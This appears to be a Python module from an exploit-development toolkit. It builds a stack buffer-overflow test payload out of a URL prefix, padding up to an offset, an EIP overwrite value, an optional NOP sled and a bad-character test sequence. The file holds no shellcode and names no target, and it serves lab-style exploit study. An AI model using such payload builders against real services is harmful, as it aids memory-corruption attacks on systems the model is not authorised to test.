from __future__ import annotations

import argparse
from struct import pack

from Tools.badchars.badchars import BadCharAnalyzer


def parse_int(value: str) -> int:
    return int(value, 0)


def parse_badchars(value: str) -> tuple[int, ...]:
    cleaned = value.replace("\\x", "").replace(" ", "").replace(",", "")
    if len(cleaned) % 2 != 0:
        raise argparse.ArgumentTypeError("badchars must contain complete hex bytes")
    return tuple(bytes.fromhex(cleaned))


def add_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--prefix", default="http://")
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument(
        "--eip",
        type=parse_int,
        default=0x42424242,
        help="EIP overwrite value, parsed like 0x625011af (default: 0x42424242)",
    )
    parser.add_argument(
        "--exclude",
        type=parse_badchars,
        default=(0x00,),
        help="Bytes excluded from the badchar sequence, e.g. 00 or 000a0d",
    )
    parser.add_argument(
        "--sled",
        type=int,
        default=0,
        help="NOP bytes before the badchar test sequence (default: 0)",
    )


def build(args: argparse.Namespace) -> bytes:
    if args.offset < 0:
        raise ValueError("--offset must be zero or greater")
    if args.sled < 0:
        raise ValueError("--sled must be zero or greater")

    badchar_test = BadCharAnalyzer(exclude=args.exclude).generate_test_bytes()
    return (
        args.prefix.encode("latin-1")
        + (b"A" * args.offset)
        + pack("<I", args.eip)
        + (b"\x90" * args.sled)
        + badchar_test
    )
